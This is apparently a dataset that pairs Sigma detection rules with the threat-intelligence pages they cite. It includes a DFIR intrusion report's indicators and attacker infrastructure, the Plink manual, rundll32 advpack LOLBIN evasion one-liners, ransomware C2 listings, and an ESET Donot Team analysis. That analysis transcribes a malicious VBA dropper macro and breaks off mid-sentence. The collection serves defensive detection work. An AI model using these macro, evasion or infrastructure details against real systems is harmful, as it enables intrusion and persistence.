6a3e07b94d2390d9906c\n141cd13c6fe9cf00d513b8e4cbc9b94b3ca9f4b3\n3bee705c062227dcb2d109bf62ab043c68ba3fb53b1ce679dc138273ba884b08\n\npth_createuser.exe\na02d89b0210671b3519c5d3818188e53\nad58d012e2bacc87f348e72e1377cf35bc6c9ebd\ne42620721f5ec455a63cded483d18dfa5abdabca3319b0a4e3e21bd098348d48\n```\n\n## Detections\n\n### Network\n\n```\nET INFO NetSupport Remote Admin Checkin\nET INFO NetSupport Remote Admin Response\nET MALWARE NetSupport RAT with System Information\nET POLICY NetSupport GeoLocation Lookup Request\nET USER_AGENTS WinRM User Agent Detected - Possible Lateral Movement\nET POLICY WinRM wsman Access - Possible Lateral Movement\nET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection\nET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection\n```\n\n### Sigma\n\nSearch sigma rules at detection.fyi\n\nSigma Repo:\n\n```\n0afbd410-de03-4078-8491-f132303cb67d - Renamed NetSupport RAT Execution\n2afafd61-6aae-4df4-baed-139fa1f4c345 - Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\n8bc64091-6875-4881-aaf9-7bd25b5dda08 - Suspicious Process Patterns NTDS.DIT Exfil\n0b8baa3f-575c-46ee-8715-d6f28cc7d33c - NTDS.DIT Created\n9f107a84-532c-41af-b005-8d12a607639f - Suspicious Cabinet File Expansion\n058f4380-962d-40a5-afce-50207d36d7e2 - HackTool - CrackMapExec Execution Patterns\n0ef56343-059e-4cb6-adc1-4c3c967c5e46 - Suspicious Execution of Systeminfo\n4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67 - Renamed ProcDump Execution\n17769c90-230e-488b-a463-e05c08e9d48f - Powershell Defender Exclusion\n1ec65a5f-9473-4f12-97da-622044d6df21 - Powershell Defender Disable Scan Feature\nad720b90-25ad-43ff-9b5e-5c841facc8e5 - Add User to Local Administrators Group\nffa28e60-bdb1-46e0-9f82-05f7a61cc06e - Suspicious Add User to Remote Desktop Users Group\n1e33157c-53b1-41ad-bbcc-780b80b58288 - WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript\ncd5cfd80-aa5f-44c0-9c20-108c4ae12e3c - New Firewall Rule Added Via Netsh.EXE\nca2092a1-c273-4878-9b4b-0d60115bf5ea - Suspicious Encoded PowerShell Command Line\n07f8bdc2-c9b3-472a-9817-5a670b872f53 - Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE\nb1ec66c6-f4d1-4b5c-96dd-af28ccae7727 - New Generic Credentials Added Via Cmdkey.EXE\n502b42de-4306-40b4-9596-6f590c81f073 - Local Accounts Discovery\n```\n\nJoe Security:\n\n```\n200105 - Powershell drops NetSupport RAT client\n```\n\nThe DFIR Report Repo:\n\n```\na5661068-c85f-4ee1-bc13-6b753bd2c7b7 - Adding, Listing and Removing Credentials via Cmdkey CommandLine Ultility\nd938de18-7f57-4c9c-93b9-a621c746d594 - NIM Pass The Hash Tooling Detection\n```\n\n### Yara\n\nYara Rules\n\n## Diamond Model\n\n```image\nAlt: Diamond Model\nDescription: The image depicts the Diamond Model of Intrusion Analysis, illustrating the relationship between the adversary, infrastructure, victim, and capabilities/TTPs (Tactics, Techniques, and Procedures). Each section includes specific details such as types of workstations, servers, and malware techniques used by the adversary. The diamond shape visually represents the interconnected factors involved in a cyber threat scenario, providing a structured view of the elements at play in an attack.\nTranscription: |\n  Adversary\n    ├── Workstations\n    │     ├── WIN-5ODCFIGQR3\n    │     ├── DESKTOP-TBD06K1\n    │     └── SSH-2.0-OpenSSH_8.4pl Debian-5+deb11u1\n    └── SSH Server\n          └── Public Key: bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef\n  \n  Infrastructure\n    ├── lotal.com (79.137.202.132) ── NetSupport Deployment Script\n    ├── 185.206.146.129:22 ── SSH Server\n    ├── npinmclaugh11.com\n    ├── npinmclaugh14.com 89.185.85.44:2145\n    ├── wsus-isv-local.tech 79.137.206.37:133\n    └── wsus-isv-internal.tech\n  \n  Victim\n    ├── Workstation\n    ├── Domain Controllers\n    │     └── ndts dump\n    └── Various Servers\n  \n  Capabilities/TTPs\n    ├── Zipped Javascript Malware Delivered via Email\n    ├── Scheduled Task Persistence\n    ├── Reverse SSH Tunnel\n    ├── Impacket Usage (WmiExec.py and AtExec.py)\n    ├── Netscan and PingCastle\n    ├── NetSupport RAT\n    ├── ProcDump LSASS\n    ├── Dump NTDS.dit\n    └── Cab packaged payloads during lateral movement\n    └── 7-zip used during data collection\n```\n\n## MITRE\n\n```image\nAlt: MITRE\nDescription: The image is a structured table summarizing various tactics and techniques associated with a cyber incident labeled '19438 - Netsupport Intrusion Results in Domain Compromise'. It is organized into categories such as Initial Access, Execution, Persistence, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, and Command and Control. Each category lists specific tools used in the intrusion along with their corresponding MITRE ATT&CK techniques identified by unique codes (e.g., T1566.001 for Phishing). The table provides a clear overview of the tactics employed during the cyber attack, facilitating understanding of the intrusion methods.\nTranscription: |\n  19438 - Netsupport Intrusion Results in Domain Compromise\n  \n  | Tools               | Technique                                       |\n  | ------------------- | ----------------------------------------------- |\n  | Initial Access      | Phishing: Spearphishing Attachment - T1566.001  |\n  | Execution           | NetSupport - T1204.002                          |\n  |                     | Malicious File - T1204.002                      |\n  |                     | JavaScript - T1059.007                          |\n  |                     | PowerShell - T1059.001                          |\n  |                     | Windows Command Shell - T1059.003               |\n  |                     | Windows Management Instrumentation - T1047      |\n  | Persistence         | NetSupport                                      |\n  |                     | Registry Run Keys / Startup Folder - T1547.001  |\n  |                     | Scheduled Task - T1053.005                      |\n  |                     | Local Account - T1136.001                       |\n  | Defense Evasion     | Expand                                          |\n  |                     | Disable or Modify Tools - T1562.001             |\n  |                     | Obfuscated Files or Information - T1027         |\n  |                     | Deobfuscate/Decode Files or Information - T1140 |\n  |                     | Masquerade Task or Service - T1036.004          |\n  | Credential Access   | Ntdsutil                                        |\n  |                     | NTDS - T1003.003                                |\n  |                     | LSASS Memory - T1003.001                        |\n  | Discovery           | SoftPerfect Netscan                             |\n  |                     | PingCastle                                      |\n  |                     | net                                             |\n  |                     | ping                                            |\n  |                     | systeminfo                                      |\n  |                     | ntest                                           |\n  |                     | cmd                                             |\n  |                     | tasklist                                        |\n  |                     | whoami                                          |\n  |                     | cmkey                                           |\n  | Lateral Movement    | Impacted                                        |\n  |                     | wmiexec.py                                      |\n  |                     | atexec.py                                       |\n  | Collection          | 7-zip                                           |\n  |                     | Archive via Utility - T1560.001                 |\n  | Command and Control | NetSupport                                      |\n  |                     | Protocol Tunneling - T1572                      |\n  |                     | Proxy - T1090                                   |\n  |                     | Uncommonly Used Port - T1065                    |\n```\n\n```\nProxy - T1090\nUncommonly Used Port - T1065\nJavaScript - T1059.007\nWindows Command Shell - T1059.003\nPowerShell - T1059.001\nRegistry Run Keys / Startup Folder - T1547.001\nScheduled Task - T1053.005\nLocal Account - T1136.001\nDisable or Modify Tools - T1562.001\nNTDS - T1003.003\nLSASS Memory - T1003.001\nProtocol Tunneling - T1572\nWindows Management Instrumentation - T1047\nRemote Desktop Protocol - T1021.001\nSystem Owner/User Discovery - T1033\nDomain Groups - T1069.002\nRemote System Discovery - T1018\nSystem Information Discovery - T1082\nProcess Discovery - T1057\nDomain Account - T1087.002\nLocal Account - T1087.001\nArchive via Utility - T1560.001\nObfuscated Files or Information - T1027\nDeobfuscate/Decode Files or Information - T1140\nMasquerade Task or Service - T1036.004\nSMB/Windows Admin Shares - T1021.002\nLateral Tool Transfer - T1570\nMalicious File - T1204.002\nDomain Trust Discovery - T1482\nGroup Policy Discovery - T1615\n```",
    "sigma_rule": {
      "title": "Renamed PingCastle Binary Execution",
      "id": "2433a154-bb3d-42e4-86c3-a26bdac91c45",
      "status": "test",
      "description": "Detects the execution of a renamed \"PingCastle\" binary based on the PE metadata fields.",
      "references": [
        "https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/",
        "https://www.pingcastle.com/documentation/scanner/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2024-01-11",
      "tags": [
        "attack.execution",
        "attack.t1059",
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": [
              "PingCastleReporting.exe",
              "PingCastleCloud.exe",
              "PingCastle.exe"
            ]
          },
          {
            "CommandLine|contains": [
              "--scanner aclcheck",
              "--scanner antivirus",
              "--scanner computerversion",
              "--scanner foreignusers",
              "--scanner laps_bitlocker",
              "--scanner localadmin",
              "--scanner nullsession",
              "--scanner nullsession-trust",
              "--scanner oxidbindings",
              "--scanner remote",
              "--scanner share",
              "--scanner smb",
              "--scanner smb3querynetwork",
              "--scanner spooler",
              "--scanner startup",
              "--scanner zerologon"
            ]
          },
          {
            "CommandLine|contains": "--no-enum-limit"
          },
          {
            "CommandLine|contains|all": [
              "--healthcheck",
              "--level Full"
            ]
          },
          {
            "CommandLine|contains|all": [
              "--healthcheck",
              "--server "
            ]
          }
        ],
        "filter_main_img": {
          "Image|endswith": [
            "\\PingCastleReporting.exe",
            "\\PingCastleCloud.exe",
            "\\PingCastle.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_pingcastle.yml",
    "id": "449"
  },
  {
    "url": "https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html",
    "markdown": "# Chapter 7: Using the command-line connection tool Plink\n\n- Chapter 7: Using the command-line connection tool Plink\n  - 7.1 Starting Plink\n  - 7.2 Using Plink\n    - 7.2.1 Using Plink for interactive logins\n    - 7.2.2 Using Plink for automated connections\n    - 7.2.3 Plink command line options\n  - 7.3 Using Plink in batch files and scripts\n  - 7.4 Using Plink with CVS\n  - 7.5 Using Plink with WinCVS\n\nPlink (PuTTY Link) is a command-line connection tool similar to UNIX `ssh`. It is mostly used for automated operations, such as making CVS access a repository on a remote server.\n\nPlink is probably not what you want if you want to run an interactive session in a console window.\n\n## 7.1 Starting Plink\n\nPlink is a command line application. This means that you cannot just double-click on its icon to run it and instead you have to bring up a console window. In Windows 95, 98, and ME, this is called an ‘MS-DOS Prompt’, and in Windows NT, 2000, and XP, it is called a ‘Command Prompt’. It should be available from the Programs section of your Start Menu.\n\nIn order to use Plink, the file `plink.exe` will need either to be on your `PATH` or in your current directory. To add the directory containing Plink to your `PATH` environment variable, type into the console window:\n\n```\nset PATH=C:\\path\\to\\putty\\directory;%PATH%\n```\n\nThis will only work for the lifetime of that particular console window. To set your `PATH` more permanently on Windows NT, 2000, and XP, use the Environment tab of the System Control Panel. On Windows 95, 98, and ME, you will need to edit your `AUTOEXEC.BAT` to include a `set` command like the one above.\n\n## 7.2 Using Plink\n\nThis section describes the basics of how to use Plink for interactive logins and for automated processes.\n\nOnce you've got a console window to type into, you can just type `plink` on its own to bring up a usage message. This tells you the version of Plink you're using, and gives you a brief summary of how to use Plink:\n\n```\nZ:\\sysosd>plink\nPuTTY Link: command-line connection utility\nRelease 0.58\nUsage: plink [options] [user@]host [command]\n       (\"host\" can also be a PuTTY saved session name)\nOptions:\n  -V        print version information and exit\n  -pgpfp    print PGP key fingerprints and exit\n  -v        show verbose messages\n  -load sessname  Load settings from saved session\n  -ssh -telnet -rlogin -raw\n            force use of a particular protocol\n  -P port   connect to specified port\n  -l user   connect with specified username\n  -batch    disable all interactive prompts\nThe following options only apply to SSH connections:\n  -pw passw login with specified password\n  -D [listen-IP:]listen-port\n            Dynamic SOCKS-based port forwarding\n  -L [listen-IP:]listen-port:host:port\n            Forward local port to remote address\n  -R [listen-IP:]listen-port:host:port\n            Forward remote port to local address\n  -X -x     enable / disable X11 forwarding\n  -A -a     enable / disable agent forwarding\n  -t -T     enable / disable pty allocation\n  -1 -2     force use of particular protocol version\n  -4 -6     force use of IPv4 or IPv6\n  -C        enable compression\n  -i key    private key file for authentication\n  -m file   read remote command(s) from file\n  -s        remote command is an SSH subsystem (SSH-2 only)\n  -N        don't start a shell/command (SSH-2 only)\n```\n\nOnce this works, you are ready to use Plink.\n\n### 7.2.1 Using Plink for interactive logins\n\nTo make a simple interactive connection to a remote server, just type `plink` and then the host name:\n\n```\nZ:\\sysosd>plink login.example.com\n\nDebian GNU/Linux 2.2 flunky.example.com\nflunky login:\n```\n\nYou should then be able to log in as normal and run a session. The output sent by the server will be written straight to your command prompt window, which will most likely not interpret terminal control codes in the way the server expects it to. So if you run any full-screen applications, for example, you can expect to see strange characters appearing in your window. Interactive connections like this are not the main point of Plink.\n\nIn order to connect with a different protocol, you can give the command line options `-ssh`, `-telnet`, `-rlogin` or `-raw`. To make an SSH connection, for example:\n\n```\nZ:\\sysosd>plink -ssh login.example.com\nlogin as:\n```\n\nIf you have already set up a PuTTY saved session, then instead of supplying a host name, you can give the saved session name. This allows you to use public-key authentication, specify a user name, and use most of the other features of PuTTY:\n\n```\nZ:\\sysosd>plink my-ssh-session\nSent username \"fred\"\nAuthenticating with public key \"fred@winbox\"\nLast login: Thu Dec  6 19:25:33 2001 from :0.0\nfred@flunky:~$\n```\n\n(You can also use the `-load` command-line option to load a saved session; see section 3.7.3.1. If you use `-load`, the saved session exists, and it specifies a hostname, you cannot also specify a `host` or `user@host` argument - it will be treated as part of the remote command.)\n\n### 7.2.2 Using Plink for automated connections\n\nMore typically Plink is used with the SSH protocol, to enable you to talk directly to a program running on the server. To do this you have to ensure Plink is *using* the SSH protocol. You can do this in several ways:\n\n- Use the `-ssh` option as described in section 7.2.1.\n- Set up a PuTTY saved session that describes the server you are connecting to, and that also specifies the protocol as SSH.\n- Set the Windows environment variable `PLINK_PROTOCOL` to the word `ssh`.\n\nUsually Plink is not invoked directly by a user, but run automatically by another process. Therefore you typically do not want Plink to prompt you for a user name or a password.\n\nNext, you are likely to need to avoid the various interactive prompts Plink can produce. You might be prompted to verify the host key of the server you're connecting to, to enter a user name, or to enter a password.\n\nTo avoid being prompted for the server host key when using Plink for an automated connection, you should first make a *manual* connection (using either of PuTTY or Plink) to the same server, verify the host key (see section 2.2 for more information), and select Yes to add the host key to the Registry. After that, Plink commands connecting to that server should not give a host key prompt unless the host key changes.\n\nTo avoid being prompted for a user name, you can:\n\n- Use the `-l` option to specify a user name on the command line. For example, `plink login.example.com -l fred`.\n- Set up a PuTTY saved session that describes the server you are connecting to, and that also specifies the username to log in as (see section 4.14.1).\n\nTo avoid being prompted for a password, you should almost certainly set up public-key authentication. (See chapter 8 for a general introduction to public-key authentication.) Again, you can do this in two ways:\n\n- Set up a PuTTY saved session that describes the server you are connecting to, and that also specifies a private key file (see section 4.20.5). For this to work without prompting, your private key will need to have no passphrase.\n- Store the private key in Pageant. See chapter 9 for further information.\n\nOnce you have done all this, you should be able to run a remote command on the SSH server machine and have it execute automatically with no prompting:\n\n```\nZ:\\sysosd>plink login.example.com -l fred echo hello, world\nhello, world\n\nZ:\\sysosd>\n```\n\nOr, if you have set up a saved session with all the connection details:\n\n```\nZ:\\sysosd>plink mysession echo hello, world\nhello, world\n\nZ:\\sysosd>\n```\n\nThen you can set up other programs to run this Plink command and talk to it as if it were a process on the server machine.\n\n### 7.2.3 Plink command line options\n\nPlink accepts all the general command line options supported by the PuTTY tools. See section 3.7.3 for a description of these options.\n\nPlink also supports some of its own options. The following sections describe Plink's specific command-line options.\n\n#### 7.2.3.1 `-batch`: disable all interactive prompts\n\nIf you use the `-batch` option, Plink will never give an interactive prompt while establishing the connection. If the server's host key is invalid, for example (see section 2.2), then the connection will simply be abandoned instead of asking you what to do next.\n\nThis may help Plink's behaviour when it is used in automated scripts: using `-batch`, if something goes wrong at connection time, the batch job will fail rather than hang.\n\n#### 7.2.3.2 `-s`: remote command is SSH subsystem\n\nIf you specify the `-s` option, Plink passes the specified command as the name of an SSH ‘subsystem’ rather than an ordinary command line.\n\n(This option is only meaningful with the SSH-2 protocol.)\n\n## 7.3 Using Plink in batch files and scripts\n\nOnce you have set up Plink to be able to log in to a remote server without any interactive prompting (see section 7.2.2), you can use it for lots of scripting and batch purposes. For example, to start a backup on a remote machine, you might use a command like:\n\n```\nplink root@myserver /etc/backups/do-backup.sh\n```\n\nOr perhaps you want to fetch all system log lines relating to a particular web area:\n\n```\nplink mysession grep /~fred/ /var/log/httpd/access.log > fredlog\n```\n\nAny non-interactive command you could usefully run on the server command line, you can run in a batch file using Plink in this way.\n\n## 7.4 Using Plink with CVS\n\nTo use Plink with CVS, you need to set the environment variable `CVS_RSH` to point to Plink:\n\n```\nset CVS_RSH=\\path\\to\\plink.exe\n```\n\nYou also need to arrange to be able to connect to a remote host without any interactive prompts, as described in section 7.2.2.\n\nYou should then be able to run CVS as follows:\n\n```\ncvs -d :ext:user@sessionname:/path/to/repository co module\n```\n\nIf you specified a username in your saved session, you don't even need to specify the ‘user’ part of this, and you can just say:\n\n```\ncvs -d :ext:sessionname:/path/to/repository co module\n```\n\n## 7.5 Using Plink with WinCVS\n\nPlink can also be used with WinCVS. Firstly, arrange for Plink to be able to connect to a remote host non-interactively, as described in section 7.2.2.\n\nThen, in WinCVS, bring up the ‘Preferences’ dialogue box from the *Admin* menu, and switch to the ‘Ports’ tab. Tick the box there labelled ‘Check for an alternate `rsh` name’ and in the text entry field to the right enter the full path to `plink.exe`. Select ‘OK’ on the ‘Preferences’ dialogue box.\n\nNext, select ‘Command Line’ from the WinCVS ‘Admin’ menu, and type a CVS command as in section 7.4, for example:\n\n```\ncvs -d :ext:user@hostname:/path/to/repository co module\n```\n\nor (if you're using a saved session):\n\n```\ncvs -d :ext:user@sessionname:/path/to/repository co module\n```\n\nSelect the folder you want to check out to with the ‘Change Folder’ button, and click ‘OK’ to check out your module. Once you've got modules checked out, WinCVS will happily invoke plink from the GUI for CVS operations.",
    "sigma_rule": {
      "title": "Renamed Plink Execution",
      "id": "1c12727d-02bf-45ff-a9f3-d49806a3cf43",
      "status": "test",
      "description": "Detects the execution of a renamed version of the Plink binary",
      "references": [
        "https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/",
        "https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-06",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": "Plink"
          },
          {
            "CommandLine|contains|all": [
              " -l forward",
              " -P ",
              " -R "
            ]
          }
        ],
        "filter": {
          "Image|endswith": "\\plink.exe"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_plink.yml",
    "id": "452"
  },
  {
    "url": "https://web.archive.org/web/20220215183046/https://twitter.com/Hexacorn/status/1224848930795552769",
    "markdown": "# Post\n\nFeb 5, 2020\n\nStay positive Lolbins... not!\n\nhttp://hexacorn.com/blog/2020/02/05/stay-positive-lolbins-not/\n\n#LOLBIN\n\n```\nrundll32 advpack.dll, RegisterOCX calc.exe\nrundll32 advpack.dll, #12 calc.exe\nrundll32 advpack.dll, #+12 calc.exe\nrundll32 advpack.dll, #-4294967284 calc.exe\n```\n\n## Comment\n\nFeb 4, 2020\n\nall right, since no one asks...a bonus\n\nfor 64-bit rundll32 you can use \n\nrundll32 advpack.dll, #-1152921504606846964 calc.exe\n\n### Comment\n\nFeb 11, 2020\n\nalso, FWIW\n\nrundll32.exe DLL, <num_no_hash> \n\n- won't work; rundll32 expects '#' after coma\nstill, this will load DLL and execute DllEntryPoint anyway\n\nmany blank characters between coma and hash are okay.\nrundll32 advpack.dll,#12 calc.exe\nrundll32 advpack.dll,   #12 calc.exe",
    "sigma_rule": {
      "title": "Suspicious Advpack Call Via Rundll32.EXE",
      "id": "a1473adb-5338-4a20-b4c3-126763e2d3d3",
      "status": "test",
      "description": "Detects execution of \"rundll32\" calling \"advpack.dll\" with potential obfuscated ordinal calls in order to leverage the \"RegisterOCX\" function",
      "references": [
        "https://web.archive.org/web/20220215183046/https://twitter.com/Hexacorn/status/1224848930795552769",
        "http://www.hexacorn.com/blog/2020/02/05/stay-positive-lolbins-not/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          },
          {
            "CommandLine|contains": "rundll32"
          }
        ],
        "selection_cli_dll": {
          "CommandLine|contains": "advpack"
        },
        "selection_cli_ordinal": [
          {
            "CommandLine|contains|all": [
              "#+",
              "12"
            ]
          },
          {
            "CommandLine|contains": "#-"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_advpack_obfuscated_ordinal_call.yml",
    "id": "454"
  },
  {
    "url": "https://twitter.com/MichalKoczwara/status/1553634816016498688",
    "markdown": "# Post\n\nJul 31, 2022\n\nRansomware Group and C2 seems to be still active\n\nA few new files added\n\n- 95.213.145.99\n- 95.213.145.101\n\n```image\nDescription: The image displays a directory listing for a server, showcasing various files available for download. The list includes executable files (e.g., 'artifact.exe', 'main.exe') and batch files (e.g., 'LOGOFALL.bat', 'shadowGuru.bat'). Some files are highlighted, indicating their potential relevance or importance in the context of cyber threats. The server IP address shown is '95.213.145.101', and it's accessed via port '8000', suggesting ongoing activity related to a ransomware group.\nTranscription: |\n  Directory listing for /\n  - artifact.exe\n  - dropper_cs.exe\n  - LOGOFALL.bat\n  - logofall1.bat\n  - main.exe\n  - MIMIMI.7z\n  - MIMIMI.zip\n  - PoshC2.bat\n  - shadowGuru.bat\n  - winrar-x64-611.exe\n  - z.bat\n```\n\n```image\nDescription: The image displays a web page showing a directory listing for the IP address 95.213.145.99 on port 8000. The page lists several files, including 'ANY_DESK.bat', 'def1.bat', 'defender+malwar.bat', 'NG.bat', 'ngrok.exe', and 'VmManagedSetup.exe'. The 'NG.bat' file is highlighted, indicating it may be of particular interest or relevance.\nTranscription: |\n  Directory listing for /\n  \n  - ANY_DESK.bat\n  - def1.bat\n  - defender+malwar.bat\n  - NG.bat\n  - ngrok.exe\n  - VmManagedSetup.exe\n```",
    "sigma_rule": {
      "title": "Disable Important Scheduled Task",
      "id": "9ac94dc8-9042-493c-ba45-3b5e7c86b980",
      "related": [
        {
          "id": "7595ba94-cf3b-4471-aa03-4f6baa9e5fad",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-8---windows---disable-the-sr-scheduled-task",
        "https://twitter.com/MichalKoczwara/status/1553634816016498688",
        "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems), X__Junior",
      "date": "2021-12-26",
      "modified": "2024-08-25",
      "tags": [
        "attack.impact",
        "attack.t1489"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains|all": [
            "/Change",
            "/TN",
            "/disable"
          ],
          "CommandLine|contains": [
            "\\Windows\\BitLocker",
            "\\Windows\\ExploitGuard",
            "\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh",
            "\\Windows\\SystemRestore\\SR",
            "\\Windows\\UpdateOrchestrator\\",
            "\\Windows\\Windows Defender\\",
            "\\Windows\\WindowsBackup\\",
            "\\Windows\\WindowsUpdate\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_disable.yml",
    "id": "472"
  },
  {
    "url": "https://www.welivesecurity.com/2022/01/18/donot-go-do-not-respawn/",
    "markdown": "# DoNot Go! Do not respawn!\n\n**ESET researchers take a deep look into recent attacks carried out by Donot Team throughout 2020 and 2021, targeting government and military entities in several South Asian countries**\n\n**Published: 18 Jan 2022**\n\n```image\nAlt: DoNot Go! Do not respawn!\nDescription: The image depicts a close-up view through a circular aperture, resembling the view through a camera lens or a similar optical device. Inside the aperture, there is a display of code, predominantly in a dark color scheme with various programming elements like 'function', 'slice', and 'removeDonut'. The surrounding area is dark with a bluish tint, suggesting a technical or digital theme, and hints at a focus on cybersecurity or programming. This visual aligns with the CTI context by emphasizing the technical nature of the research on the Donot Team's attacks.\nTranscription: |\n  b in d?\n  embed in d?\n  object\n  10,\n  function(a, b) {\n    return d.slice(5);\n  }\n  removeDonut(this);\n  function() {\n    return removeData();\n  }\n```\n\n## Introduction\n\nDonot Team (also known as APT-C-35 and SectorE02) is a threat actor operating since at least 2016 and known for targeting organizations and individuals in South Asia with Windows and Android malware. A recent report by Amnesty International links the group’s malware to an Indian cybersecurity company that may be selling the spyware or offering a hackers-for-hire service to governments of the region.\n\nWe have been closely following the activities of Donot Team, and have traced several campaigns that leverage Windows malware derived from the group’s signature yty malware framework. According to our findings, the group is very persistent and has consistently targeted the same organizations for at least the last two years.\n\nIn this blogpost, we document two variants of the malware used in recent campaigns – DarkMusical and Gedit. For each of the variants, we analyze the whole attack chain and provide insight into how the group updates its tools, tactics, and techniques.\n\n## Targets\n\nThe campaigns of Donot Team are motivated by espionage, using their signature malware: the “yty” malware framework, whose main purpose is to collect and exfiltrate data. According to our telemetry, Donot Team focuses on a small number of targets in South Asia – Bangladesh, Sri Lanka, Pakistan, and Nepal – as seen in Figure 1.\n\n```image\nAlt: Figure 1. Countries targeted in recent Donot Team campaigns\nDescription: The image is a map highlighting specific countries in South Asia: Pakistan, Bangladesh, Nepal, and Sri Lanka. These countries are shaded in a darker color against a light blue background, which features outlines of surrounding countries. The title \"we live security\" is faintly visible in the background, suggesting a connection to cybersecurity or threat intelligence. This visual effectively illustrates the focus areas of the Donot Team's campaigns as mentioned in the accompanying text.\n```\n\n*Figure 1. Countries targeted in recent Donot Team campaigns*\n\nThese attacks are focused on:\n- Government and military organizations\n- Ministries of Foreign Affairs\n- Embassies\n\nGoing as far as targeting embassies of these countries in other regions, such as the Middle East, Europe, North America, and Latin America, is also not outside Donot Team’s realm.\n\n## Try, try, try again\n\nIt’s not a rarity for APT operators to attempt to regain access to a compromised network after they have been ejected from it. In some cases, this is achieved through the deployment of a stealthier backdoor that remains quiet until the attackers need it; in other cases, they simply restart their operation with new malware or a variant of the malware they used previously. The latter is the case with Donot Team operators, only that they are remarkably persistent in their attempts.\n\nAccording to ESET telemetry, Donot Team has been consistently targeting the same entities with waves of spearphishing emails with malicious attachments every two to four months. Interestingly, emails we were able to retrieve and analyze did not show signs of spoofing. Some emails were sent from the same organizations that were being attacked. It’s possible that the attackers may have compromised the email accounts of some of their victims in earlier campaigns, or the email server used by those organizations.\n\nWith spearphishing emails, the attackers use malicious Microsoft Office documents to deploy their malware. We have seen Donot Team using at least three techniques. One is macros in Word, Excel, and PowerPoint documents, such as the example seen in Figure 2.\n\n```image\nAlt: Figure 2. Malicious macro in a PowerPoint document that drops a downloader executable and creates a scheduled task to run it\nDescription: The image displays a snippet of Visual Basic for Applications (VBA) code, which is indicative of a malicious macro used in a Microsoft Office document. The code includes functions for automatic execution (Auto_Open) and attempts to create a scheduled task that runs a specified program. It also utilizes system environment variables and includes error handling for file operations. This kind of macro is commonly associated with malware deployment techniques, specifically aimed at executing a downloader executable.\nTranscription: |\n  Attribute VB_Name = \"Module1\"\n  Sub Auto_Open()\n      Dim akdilIdIdlIdIdIdIdjlaikmd As Long\n      Dim JdklkIalfaIeldUXklsIudklal() As String\n      Dim akjsdoead As String\n      Dim adfaheggasad As String\n      Dim Fn As Integer\n      adfaheggasad = (Environs(\"TEMP\"))\n      rakdifier = \"defecidil\"\n      lakjdiei = radkifier\n      lakjdiei = Replace(lakjdiei, \"GKG\", \"\")\n      jkfjasd = Replace(lakjdiei, \"k\", \"+\")\n      akjsdoead = (Environs(\"PUBLIC\") + \"Music\" + \"r\" + \"iha\" + \"na.\" + jkfjasd)\n      JdklkIalfaIeldUXklsIudklal = Split(UCase(u.text), \"_\")\n      Fn = FreeFile\n      Open akjsdoead For Binary Lock Read Write As #Fn\n          For akdilIdIdlIdIdIdjlaikmd = LBound(JdklkIalfaIeldUXklsIudklal) To UBound(JdklkIalfaIeldUXklsIudklal)\n              Put #Fn, CByte(JdklkIalfaIeldUXklsIudklal(akdilIdIdlIdIdIdjlaikmd))\n          Next akdilIdIdlIdIdIdjlaikmd\n      Close #Fn\n      KDKLISLDYDLLDymmd = MsgBox(\"Critical Error Unable to open file\", vbOK, \"Microsoft Office Error\")\n      su = Shell(\"SchTasks /Create /SC minute /mo 15 /f /tn \"\"musudt\"\" /TR \"\"\" + akjsdoead + \"\"\"\", 0)\n  End Sub\n```\n\n*Figure 2. Malicious macro in a PowerPoint document that drops a downloader executable and creates a scheduled task to run 